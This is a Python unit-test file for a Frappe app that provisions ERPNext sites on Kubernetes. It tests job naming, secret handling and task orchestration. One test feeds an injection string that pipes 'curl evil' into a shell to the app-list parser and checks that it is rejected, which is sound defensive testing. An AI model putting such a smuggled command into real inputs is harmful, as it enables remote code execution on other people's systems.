# Copyright (c) 2026, Los Favs and Contributors
# See license.txt

from types import SimpleNamespace
from unittest.mock import MagicMock

import pytest
from frappe.tests import UnitTestCase

from kubeport.tasks.site_tasks import (
	_bench_new_site_command,
	_build_creds_secret_manifest,
	_build_env,
	_build_job_manifest,
	_clone_reference_pod_spec,
	_job_name,
	_merge_env,
	_parse_install_apps,
	_safe_label_value,
)


class UnitTestSiteHelpers(UnitTestCase):
	def test_job_name_slugifies_and_includes_token_prefix(self):
		name = _job_name("erp.example.com", "deadbeefdeadbeefdeadbeefdeadbeef")
		# '.' → '-', collapsed, prefix, and token[:12]
		self.assertEqual(name, "ks-erp-example-com-deadbeefdead")

	def test_job_name_truncates_long_site_to_40_chars_of_slug(self):
		site = "a" * 80
		name = _job_name(site, "abcdefabcdefabcdefabcdefabcdefab")
		# prefix "ks-" (3) + 40 a's + '-' + 12 hex = 56
		self.assertEqual(name, "ks-" + "a" * 40 + "-abcdefabcdef")

	def test_safe_label_value_strips_slash_and_truncates_to_63(self):
		value = "helm-release/" + "x" * 100
		result = _safe_label_value(value)
		self.assertLessEqual(len(result), 63)
		self.assertNotIn("/", result)
		self.assertFalse(result.endswith("-"))

	def test_parse_install_apps_strips_blank_lines_and_whitespace(self):
		self.assertEqual(
			_parse_install_apps("  erpnext  \n\n  payments  \n"),
			["erpnext", "payments"],
		)

	def test_parse_install_apps_rejects_shell_metacharacters(self):
		with pytest.raises(ValueError):
			_parse_install_apps('erpnext"; curl evil | sh; #')

	def test_parse_install_apps_rejects_uppercase_and_spaces(self):
		with pytest.raises(ValueError):
			_parse_install_apps("ERPNext")
		with pytest.raises(ValueError):
			_parse_install_apps("erp next")

	def test_parse_install_apps_returns_empty_on_none_or_whitespace(self):
		self.assertEqual(_parse_install_apps(None), [])
		self.assertEqual(_parse_install_apps("   \n\n"), [])

	def test_bench_command_appends_force_when_requested(self):
		cmd_forced = _bench_new_site_command("s1", ["erpnext"], force=True)
		cmd_unforced = _bench_new_site_command("s1", ["erpnext"], force=False)
		self.assertIn("--force", cmd_forced)
		self.assertNotIn("--force", cmd_unforced)

	def test_bench_command_quotes_install_apps(self):
		cmd = _bench_new_site_command("s1", ["erpnext", "payments"], force=False)
		self.assertIn('--install-app="erpnext"', cmd)
		self.assertIn('--install-app="payments"', cmd)

	def test_build_env_uses_postgres_root_user_for_postgres(self):
		env = _build_env(
			site_name="s1",
			db_type="postgres",
			creds_secret_name="job-creds",
			db_root_in_creds=True,
			db_root_secret="",
			db_root_secret_key="",
		)
		db_root_user = next(e for e in env if e["name"] == "DB_ROOT_USER")
		self.assertEqual(db_root_user["value"], "postgres")

	def test_build_env_admin_password_always_references_creds_secret(self):
		env = _build_env(
			site_name="s1",
			db_type="mariadb",
			creds_secret_name="ks-s1-aaaabbbbcccc-creds",
			db_root_in_creds=True,
			db_root_secret="",
			db_root_secret_key="",
		)
		admin = next(e for e in env if e["name"] == "ADMIN_PASSWORD")
		# Security: must not appear as plaintext "value"; must be secretKeyRef.
		self.assertNotIn("value", admin)
		self.assertEqual(
			admin["valueFrom"]["secretKeyRef"],
			{"name": "ks-s1-aaaabbbbcccc-creds", "key": "ADMIN_PASSWORD"},
		)

	def test_build_env_db_root_uses_user_secret_when_provided(self):
		env = _build_env(
			site_name="s1",
			db_type="mariadb",
			creds_secret_name="job-creds",
			db_root_in_creds=False,
			db_root_secret="mariadb-root-secret",
			db_root_secret_key="password",
		)
		db_root_password = next(e for e in env if e["name"] == "DB_ROOT_PASSWORD")
		self.assertNotIn("value", db_root_password)
		self.assertEqual(
			db_root_password["valueFrom"]["secretKeyRef"],
			{"name": "mariadb-root-secret", "key": "password"},
		)

	def test_build_env_db_root_falls_back_to_creds_secret_when_no_user_secret(self):
		env = _build_env(
			site_name="s1",
			db_type="mariadb",
			creds_secret_name="ks-s1-aaaabbbbcccc-creds",
			db_root_in_creds=True,
			db_root_secret="",
			db_root_secret_key="",
		)
		db_root_password = next(e for e in env if e["name"] == "DB_ROOT_PASSWORD")
		self.assertNotIn("value", db_root_password)
		self.assertEqual(
			db_root_password["valueFrom"]["secretKeyRef"],
			{"name": "ks-s1-aaaabbbbcccc-creds", "key": "DB_ROOT_PASSWORD"},
		)

	def test_build_creds_secret_manifest_includes_admin_always(self):
		manifest = _build_creds_secret_manifest(
			secret_name="ks-demo-aaaa-creds",
			namespace="ns",
			site_docname="release/demo",
			admin_password="pw",
			db_root_password=None,
		)
		self.assertEqual(manifest["kind"], "Secret")
		self.assertEqual(manifest["type"], "Opaque")
		self.assertEqual(manifest["stringData"]["ADMIN_PASSWORD"], "pw")
		self.assertNotIn("DB_ROOT_PASSWORD", manifest["stringData"])
		# Carries the managed-by + frappe-site labels so sweeps can find it.
		labels = manifest["metadata"]["labels"]
		self.assertEqual(labels["app.kubernetes.io/managed-by"], "kubeport")

	def test_build_creds_secret_manifest_includes_db_root_when_provided(self):
		manifest = _build_creds_secret_manifest(
			secret_name="ks-demo-aaaa-creds",
			namespace="ns",
			site_docname="release/demo",
			admin_password="pw",
			db_root_password="root-pw",
		)
		self.assertEqual(manifest["stringData"]["DB_ROOT_PASSWORD"], "root-pw")

	def test_merge_env_has_overrides_win_on_name_collision(self):
		base = [
			{"name": "SITE_NAME", "value": "old"},
			{"name": "EXTRA", "value": "keep"},
		]
		overrides = [{"name": "SITE_NAME", "value": "new"}]
		merged = _merge_env(base, overrides)
		site_name = next(e for e in merged if e["name"] == "SITE_NAME")
		self.assertEqual(site_name["value"], "new")
		# base entries with non-conflicting names are preserved
		self.assertTrue(any(e["name"] == "EXTRA" for e in merged))


class UnitTestClonePodSpec(UnitTestCase):
	def _ref_pod(self, include_sites_mount: bool = True) -> SimpleNamespace:
		sites_mount = SimpleNamespace(
			name="sites-volume",
			mount_path="/home/frappe/frappe-bench/sites",
		)
		config_mount = SimpleNamespace(
			name="config-volume",
			mount_path="/home/frappe/frappe-bench/sites/common_site_config.json",
		)
		container = SimpleNamespace(
			name="frappe",
			image="frappe/erpnext:v15.0.0",
			volume_mounts=[sites_mount, config_mount] if include_sites_mount else [config_mount],
			env=[{"name": "DB_HOST", "value": "mariadb"}],
			env_from=[{"configMapRef": {"name": "frappe-config"}}],
			resources={"requests": {"cpu": "100m"}},
			security_context={"runAsUser": 1000},
		)
		sites_volume = SimpleNamespace(
			name="sites-volume",
			persistent_volume_claim={"claimName": "sites-pvc"},
		)
		unused_volume = SimpleNamespace(
			name="not-referenced",
			empty_dir={},
		)
		spec = SimpleNamespace(
			containers=[container],
			volumes=[sites_volume, unused_volume],
			service_account_name="frappe-sa",
			image_pull_secrets=[{"name": "registry-secret"}],
			security_context={"fsGroup": 1000},
			node_selector={"role": "frappe"},
			tolerations=[{"key": "dedicated", "operator": "Equal", "value": "frappe"}],
			affinity=None,
			priority_class_name="high",
			runtime_class_name=None,
		)
		return SimpleNamespace(spec=spec)

	def _fake_api_client(self) -> MagicMock:
		api_client = MagicMock()
		# sanitize_for_serialization returns a list/dict of plain dicts in the test helpers
		def _sanitize(value):
			if value is None:
				return None
			if isinstance(value, list):
				return [_sanitize(v) for v in value]
			if isinstance(value, dict):
				return value
			if isinstance(value, SimpleNamespace):
				return {
					k.replace("_", ""): _sanitize(v) if not isinstance(v, (str, int, dict)) else v
					for k, v in vars(value).items()
					if v is not None
				}
			return value

		def _sanitize_vm(vm):
			return {"name": vm.name, "mountPath": vm.mount_path}

		def _sanitize_vol(v):
			return {"name": v.name}

		def sanitize(value):
			if isinstance(value, list) and value and isinstance(value[0], SimpleNamespace):
				first = value[0]
				if hasattr(first, "mount_path"):
					return [_sanitize_vm(vm) for vm in value]
				if hasattr(first, "persistent_volume_claim") or hasattr(first, "empty_dir"):
					return [_sanitize_vol(v) for v in value]
			return value
		api_client.sanitize_for_serialization.side_effect = sanitize
		return api_client

	def test_clone_lifts_whitelisted_pod_level_fields(self):
		ref = _clone_reference_pod_spec(self._fake_api_client(), self._ref_pod())
		pod_level = ref["pod_level"]
		self.assertEqual(pod_level["serviceAccountName"], "frappe-sa")
		self.assertEqual(pod_level["imagePullSecrets"], [{"name": "registry-secret"}])
		self.assertEqual(pod_level["securityContext"], {"fsGroup": 1000})
		self.assertEqual(pod_level["nodeSelector"], {"role": "frappe"})
		self.assertEqual(pod_level["priorityClassName"], "high")
		# None/empty fields are filtered out
		self.assertNotIn("affinity", pod_level)
		self.assertNotIn("runtimeClassName", pod_level)

	def test_clone_includes_container_env_env_from_resources_security_context(self):
		ref = _clone_reference_pod_spec(self._fake_api_client(), self._ref_pod())
		self.assertEqual(ref["container_env"], [{"name": "DB_HOST", "value": "mariadb"}])
		self.assertEqual(
			ref["container_env_from"],
			[{"configMapRef": {"name": "frappe-config"}}],
		)
		self.assertEqual(ref["container_resources"], {"requests": {"cpu": "100m"}})
		self.assertEqual(ref["container_security_context"], {"runAsUser": 1000})

	def test_clone_filters_volumes_to_those_the_container_references(self):
		ref = _clone_reference_pod_spec(self._fake_api_client(), self._ref_pod())
		vol_names = {v["name"] for v in ref["volumes"]}
		# sites-volume and config-volume are referenced; not-referenced is not
		self.assertIn("sites-volume", vol_names)
		self.assertNotIn("not-referenced", vol_names)

	def test_clone_raises_when_sites_mount_is_missing(self):
		with pytest.raises(RuntimeError):
			_clone_reference_pod_spec(self._fake_api_client(), self._ref_pod(False))


class UnitTestJobManifest(UnitTestCase):
	def _ref_spec(self) -> dict:
		return {
			"image": "frappe/erpnext:v15.0.0",
			"pod_level": {
				"serviceAccountName": "frappe-sa",
				"imagePullSecrets": [{"name": "registry-secret"}],
				"securityContext": {"fsGroup": 1000},
			},
			"container_env": [{"name": "DB_HOST", "value": "mariadb"}],
			"container_env_from": [{"configMapRef": {"name": "frappe-config"}}],
			"container_resources": {"requests": {"cpu": "100m"}},
			"container_security_context": {"runAsUser": 1000},
			"volume_mounts": [{"name": "sites", "mountPath": "/home/frappe/frappe-bench/sites"}],
			"volumes": [{"name": "sites", "persistentVolumeClaim": {"claimName": "sites-pvc"}}],
		}

	def test_manifest_lifts_pod_level_fields(self):
		manifest = _build_job_manifest(
			job_name="ks-demo-abcdef123456",
			namespace="ns",
			site_docname="release-a/demo.example.com",
			site_name="demo.example.com",
			db_type="mariadb",
			install_apps=["erpnext"],
			force_create=False,
			creds_secret_name="ks-demo-aaaabbbbcccc-creds",
			db_root_in_creds=True,
			db_root_secret="",
			db_root_secret_key="",
			ref_spec=self._ref_spec(),
		)
		pod = manifest["spec"]["template"]["spec"]
		self.assertEqual(pod["serviceAccountName"], "frappe-sa")
		self.assertEqual(pod["imagePullSecrets"], [{"name": "registry-secret"}])
		self.assertEqual(pod["securityContext"], {"fsGroup": 1000})

	def test_manifest_container_includes_env_from_and_resources(self):
		manifest = _build_job_manifest(
			job_name="ks-demo-abcdef123456",
			namespace="ns",
			site_docname="release-a/demo",
			site_name="demo",
			db_type="mariadb",
			install_apps=[],
			force_create=False,
			creds_secret_name="ks-demo-aaaabbbbcccc-creds",
			db_root_in_creds=True,
			db_root_secret="",
			db_root_secret_key="",
			ref_spec=self._ref_spec(),
		)
		container = manifest["spec"]["template"]["spec"]["containers"][0]
		self.assertEqual(container["envFrom"], [{"configMapRef": {"name": "frappe-config"}}])
		self.assertEqual(container["resources"], {"requests": {"cpu": "100m"}})
		self.assertEqual(container["securityContext"], {"runAsUser": 1000})

	def test_manifest_site_env_wins_over_bench_env(self):
		ref = self._ref_spec()
		ref["container_env"] = [{"name": "SITE_NAME", "value": "WRONG"}]
		manifest = _build_job_manifest(
			job_name="ks-demo-abcdef123456",
			namespace="ns",
			site_docname="release-a/demo",
			site_name="demo",
			db_type="mariadb",
			install_apps=[],
			force_create=False,
			creds_secret_name="ks-demo-aaaabbbbcccc-creds",
			db_root_in_creds=True,
			db_root_secret="",
			db_root_secret_key="",
			ref_spec=ref,
		)
		env = manifest["spec"]["template"]["spec"]["containers"][0]["env"]
		site_name_entries = [e for e in env if e["name"] == "SITE_NAME"]
		self.assertEqual(len(site_name_entries), 1)
		self.assertEqual(site_name_entries[0]["value"], "demo")


class UnitTestOperationTokenGuard(UnitTestCase):
	def test_site_operation_matches_returns_false_on_token_mismatch(self):
		from unittest.mock import patch

		from kubeport.tasks.site_tasks import _site_operation_matches

		with patch("kubeport.tasks.site_tasks.frappe.db.get_value") as mock_get:
			mock_get.return_value = {"operation_token": "current", "status": "In Progress"}
			self.assertFalse(_site_operation_matches("site", "stale", "In Progress"))

	def test_site_operation_matches_returns_false_on_status_mismatch(self):
		from unittest.mock import patch

		from kubeport.tasks.site_tasks import _site_operation_matches

		with patch("kubeport.tasks.site_tasks.frappe.db.get_value") as mock_get:
			mock_get.return_value = {"operation_token": "token", "status": "Active"}
			self.assertFalse(_site_operation_matches("site", "token", "In Progress"))

	def test_site_operation_matches_returns_true_when_both_match(self):
		from unittest.mock import patch

		from kubeport.tasks.site_tasks import _site_operation_matches

		with patch("kubeport.tasks.site_tasks.frappe.db.get_value") as mock_get:
			mock_get.return_value = {"operation_token": "token", "status": "In Progress"}
			self.assertTrue(_site_operation_matches("site", "token", "In Progress"))


def _fake_frappe_site_doc(site_name: str = "demo.example.com") -> MagicMock:
	"""Build a mock Frappe Site doc with typical fields populated."""
	doc = MagicMock()
	doc.name = f"release-a/{site_name}"
	doc.site_name = site_name
	doc.bench_release = "release-a"
	doc.db_type = "mariadb"
	doc.install_apps = "erpnext"
	doc.force_create = 0
	doc.db_root_secret = ""
	doc.db_root_secret_key = "mariadb-root-password"
	# get_password returns the secret regardless of which field is asked for,
	# but tests inspect the calls to distinguish.
	doc.get_password.side_effect = lambda field: {
		"admin_password": "admin-pw",
		"db_root_password": "root-pw",
	}.get(field, "")
	doc.db_set = MagicMock()
	return doc


def _fake_release() -> MagicMock:
	release = MagicMock()
	release.cluster = "cluster-a"
	release.namespace = "bench-ns"
	release.release_name = "bench-a"
	return release


class UnitTestCreateSiteTask(UnitTestCase):
	"""End-to-end mocked tests for ``create_site_task``.

	These cover the orchestration path (K8s client setup, Secret+Job apply,
	token bookkeeping, failure rollback) that the helper-level tests above
	never exercise.
	"""

	def test_create_site_task_exits_early_when_token_superseded(self):
		from unittest.mock import patch

		from kubeport.tasks import site_tasks

		with patch.object(site_tasks, "_site_operation_matches", return_value=False), \
			patch.object(site_tasks, "frappe") as mock_frappe, \
			patch.object(site_tasks, "get_k8s_api_client") as mock_get_client:
			site_tasks.create_site_task("release-a/demo", "stale-token")
			# Stale worker must not even fetch the doc.
			mock_frappe.get_doc.assert_not_called()
			mock_get_client.assert_not_called()

	def test_create_site_task_applies_secret_then_job_and_sets_tokens(self):
		from unittest.mock import patch

		from kubeport.tasks import site_tasks

		doc = _fake_frappe_site_doc()
		release = _fake_release()
		applied: list[tuple[str, dict]] = []

		def _apply(_api_client, manifest, _ns):
			applied.append((manifest["kind"], manifest))

		with patch.object(site_tasks, "_site_operation_matches", return_value=True), \
			patch.object(site_tasks, "frappe") as mock_frappe, \
			patch.object(site_tasks, "get_k8s_api_client") as mock_get_client, \
			patch.object(site_tasks, "_select_site_discovery_pod") as mock_select, \
			patch.object(site_tasks, "_clone_reference_pod_spec") as mock_clone, \
			patch.object(site_tasks, "apply_resource", side_effect=_apply), \
			patch.object(site_tasks, "client") as mock_client:
			mock_frappe.get_doc.side_effect = lambda doctype, name: (
				doc if doctype == "Frappe Site" else release
			)
			mock_get_client.return_value = MagicMock()
			mock_select.return_value = MagicMock()
			mock_clone.return_value = {
				"image": "frappe/erpnext:v15.0.0",
				"pod_level": {},
				"container_env": [],
				"container_env_from": [],
				"container_resources": None,
				"container_security_context": None,
				"volume_mounts": [{"name": "sites", "mountPath": "/home/frappe/frappe-bench/sites"}],
				"volumes": [{"name": "sites", "persistentVolumeClaim": {"claimName": "s-pvc"}}],
			}
			# Read back fake Job with a UID so the ownerRef patch runs.
			batch_api = MagicMock()
			batch_api.read_namespaced_job.return_value = SimpleNamespace(
				metadata=SimpleNamespace(uid="job-uid-123")
			)
			mock_client.BatchV1Api.return_value = batch_api
			mock_client.CoreV1Api.return_value = MagicMock()

			site_tasks.create_site_task("release-a/demo.example.com", "tok" * 10 + "ab")

		# Exactly three applies: Secret (first), Job, Secret again with ownerRef.
		kinds = [k for k, _ in applied]
		self.assertEqual(kinds, ["Secret", "Job", "Secret"])

		# The Secret is named after the Job and owner-referenced on the
		# second apply, guaranteeing GC-on-Job-delete.
		secret_first = applied[0][1]
		job_manifest = applied[1][1]
		secret_second = applied[2][1]
		self.assertTrue(secret_first["metadata"]["name"].endswith("-creds"))
		self.assertEqual(
			secret_first["metadata"]["name"],
			job_manifest["metadata"]["name"] + "-creds",
		)
		self.assertNotIn("ownerReferences", secret_first["metadata"])
		self.assertEqual(
			secret_second["metadata"]["ownerReferences"][0]["uid"], "job-uid-123"
		)

		# No plaintext password env values anywhere on the Job.
		container = job_manifest["spec"]["template"]["spec"]["containers"][0]
		for entry in container["env"]:
			if entry["name"] in ("ADMIN_PASSWORD", "DB_ROOT_PASSWORD"):
				self.assertNotIn("value", entry)
				self.assertIn("valueFrom", entry)

		# Doc got its job-bookkeeping fields set.
		set_fields = {call.args[0] for call in doc.db_set.call_args_list}
		self.assertIn("creation_job_name", set_fields)
		self.assertIn("creation_job_token", set_fields)

	def test_create_site_task_marks_failed_and_cleans_up_secret_on_exception(self):
		from unittest.mock import patch

		from kubeport.tasks import site_tasks

		doc = _fake_frappe_site_doc()
		release = _fake_release()

		def _apply_that_fails_on_job(_api_client, manifest, _ns):
			if manifest["kind"] == "Job":
				raise RuntimeError("simulated apiserver blip")

		deleted: list[str] = []

		def _capture_delete(_api_client, name, _namespace):
			deleted.append(name)

		with patch.object(site_tasks, "_site_operation_matches", return_value=True), \
			patch.object(site_tasks, "frappe") as mock_frappe, \
			patch.object(site_tasks, "get_k8s_api_client") as mock_get_client, \
			patch.object(site_tasks, "_select_site_discovery_pod") as mock_select, \
			patch.object(site_tasks, "_clone_reference_pod_spec") as mock_clone, \
			patch.object(site_tasks, "apply_resource", side_effect=_apply_that_fails_on_job), \
			patch.object(site_tasks, "_best_effort_delete_secret", side_effect=_capture_delete), \
			patch.object(site_tasks, "client") as mock_client:
			mock_frappe.get_doc.side_effect = lambda doctype, name: (
				doc if doctype == "Frappe Site" else release
			)
			mock_get_client.return_value = MagicMock()
			mock_select.return_value = MagicMock()
			mock_clone.return_value = {
				"image": "frappe/erpnext:v15.0.0",
				"pod_level": {},
				"container_env": [],
				"container_env_from": [],
				"container_resources": None,
				"container_security_context": None,
				"volume_mounts": [{"name": "sites", "mountPath": "/home/frappe/frappe-bench/sites"}],
				"volumes": [{"name": "sites", "persistentVolumeClaim": {"claimName": "s-pvc"}}],
			}
			mock_client.BatchV1Api.return_value = MagicMock()
			mock_client.CoreV1Api.return_value = MagicMock()

			site_tasks.create_site_task("release-a/demo.example.com", "tok" * 10 + "ab")

		# Orphan-Secret cleanup fired with the expected name.
		self.assertEqual(len(deleted), 1)
		self.assertTrue(deleted[0].endswith("-creds"))

		# Doc marked Failed with a truncated status_detail.
		field_values = {call.args[0]: call.args[1] for call in doc.db_set.call_args_list}
		self.assertEqual(field_values.get("status"), "Failed")
		self.assertIn("simulated apiserver blip", field_values.get("status_detail", ""))


class UnitTestCancelSiteTask(UnitTestCase):
	def test_cancel_site_task_tolerates_404_on_job_delete(self):
		from unittest.mock import patch

		from kubernetes.client.rest import ApiException

		from kubeport.tasks import site_tasks

		batch_api = MagicMock()
		batch_api.delete_namespaced_job.side_effect = ApiException(status=404, reason="NotFound")

		with patch.object(site_tasks, "get_k8s_api_client") as mock_get_client, \
			patch.object(site_tasks, "client") as mock_client, \
			patch.object(site_tasks, "_best_effort_delete_secret") as mock_del_secret, \
			patch.object(site_tasks.frappe, "log_error") as mock_log_error:
			mock_get_client.return_value = MagicMock()
			mock_client.BatchV1Api.return_value = batch_api

			site_tasks.cancel_site_task("cluster-a", "bench-ns", "ks-demo-aaaabbbbcccc")

		# 404 must NOT raise or log an error; Secret cleanup must still run.
		mock_log_error.assert_not_called()
		mock_del_secret.assert_called_once()
		_, name, namespace = mock_del_secret.call_args.args
		self.assertEqual(name, "ks-demo-aaaabbbbcccc-creds")
		self.assertEqual(namespace, "bench-ns")

	def test_cancel_site_task_logs_non_404_errors_but_still_cleans_secret(self):
		from unittest.mock import patch

		from kubernetes.client.rest import ApiException

		from kubeport.tasks import site_tasks

		batch_api = MagicMock()
		batch_api.delete_namespaced_job.side_effect = ApiException(status=500, reason="BoomError")

		with patch.object(site_tasks, "get_k8s_api_client") as mock_get_client, \
			patch.object(site_tasks, "client") as mock_client, \
			patch.object(site_tasks, "_best_effort_delete_secret") as mock_del_secret, \
			patch.object(site_tasks.frappe, "log_error") as mock_log_error:
			mock_get_client.return_value = MagicMock()
			mock_client.BatchV1Api.return_value = batch_api

			site_tasks.cancel_site_task("cluster-a", "bench-ns", "ks-demo-aaaabbbbcccc")

		mock_log_error.assert_called_once()
		# Even after a non-404 Job delete error, we still attempt Secret cleanup.
		mock_del_secret.assert_called_once()
